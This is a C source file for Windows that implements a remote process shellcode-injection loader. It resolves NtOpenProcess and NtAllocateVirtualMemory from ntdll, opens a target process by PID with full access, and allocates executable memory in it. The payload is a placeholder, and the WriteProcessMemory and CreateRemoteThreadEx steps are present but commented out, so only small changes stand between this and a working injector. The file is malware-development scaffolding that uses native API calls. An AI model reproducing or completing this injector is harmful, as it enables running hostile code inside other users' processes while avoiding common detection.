#include <Windows.h>
#include <stdio.h>
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

/*------STRUCTURES---------*/ 

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; 
	PVOID SecurityQualityOfService; 
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


/*----------Function Prototype---------*/

typedef NTSTATUS (NTAPI* (NtOpenProcess))(
	_Out_ PHANDLE ProcessHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PCLIENT_ID ClientId
);

typedef NTSTATUS (NTAPI* (NtAllocateVirtualMemory))(
	_In_ HANDLE ProcessHandle,
	_Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
	_In_ ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG AllocationType,
	_In_ ULONG Protect
);


int main(int argc, char* argv[]) {

	DWORD PID			= NULL;
	HANDLE hThread		= NULL;
	HANDLE hProcess		= NULL;
	HMODULE NtdllHandle = NULL;
	PVOID rBuffer		= NULL;
	NTSTATUS STATUS		= NULL;
	
	unsigned char shellcode[]	= "\x41\x41\x41\x41";
	SIZE_T shellsize			= sizeof(shellcode);
	

	if (argc < 2) {
		printf("Usage: %s <PID>\n", argv[0]);
		return -1;
	}

	PID = atoi(argv[1]);

	NtdllHandle = GetModuleHandleW(L"NTDLL");
	if (!NtdllHandle) {
		printf("[GetModuleHandleW] failed, error: 0x%lx", GetLastError());
		return FALSE;
	}
	printf("[0x%p] got the address of NTDLL!", NtdllHandle);
	
	OBJECT_ATTRIBUTES OA = { sizeof(OA) , NULL };
	CLIENT_ID CID = { (HANDLE)PID , NULL };

	puts("Populating Functions ...");
	/*Syntax : <Function Prototype Defined> <name> = (<FPD>)GetProcAddress(<handle> , '<function name>')*/
	NtOpenProcess NtOpenProc = (NtOpenProcess)GetProcAddress(NtdllHandle, "NtOpenProcess");
	NtAllocateVirtualMemory NtVirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(NtdllHandle, "NtAllocateVirtualMemory");


	printf("Getting a handle to process  [ %ld ]\n", PID);
	//hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	STATUS = NtOpenProc(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS != STATUS_SUCCESS) {
		printf("[ %ld ]: open process failed. ERROR : %lx\n", PID, STATUS);
		return EXIT_FAILURE;
	}
	puts("Handle to process successful...\n");
	printf("Process  handle at [ 0x%lx ]", hProcess);

	////Buffer Creation
	puts("\n Allocating buffer...\n");
	STATUS = NtVirtualAlloc(hProcess, &rBuffer, 0, &shellsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	//rBuffer = NtVirtualAlloc(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	//if (!rBuffer) {
	if (STATUS != STATUS_SUCCESS) {
		printf("[ %ld ]: Memory allocation failed. ERROR : %lx\n", PID, STATUS);
		goto CLEANUP;
	}
	puts("Memory allocation successful...\n");
	printf("Memory allocated at [ 0x%lx ]", rBuffer);

	////Writing into buffer
	//puts("\n Writing into buffer...");
	//WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), 0);
	//puts("Writing into buffer successful...\n");

	////Remote Thread
	//puts("\n Creating a Thread...");
	//hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0);
	//if (!hThread) {
	//	printf("[ %ld ]: Remote thread failed. ERROR : %lx\n", PID, GetLastError());
	//	goto CLEANUP;
	//}
	//puts("Remote threadsuccessful...\n");
	//printf("Remote thread at [ 0x%lx ]\n", hThread);

	//puts("Waiting for object\n");
	//WaitForSingleObject(hThread, INFINITE);
	//puts("Thread execution done.\n");
	//puts("Stating the cleaning process.\n");

CLEANUP:
	if (hThread) {
		puts("Closing handle on Thread\n");
		CloseHandle(hThread);
	}
	if (hProcess) {
		puts("Closing handle on Process\n");
		CloseHandle(hProcess);
	}
	puts("Done");
	return EXIT_SUCCESS;
}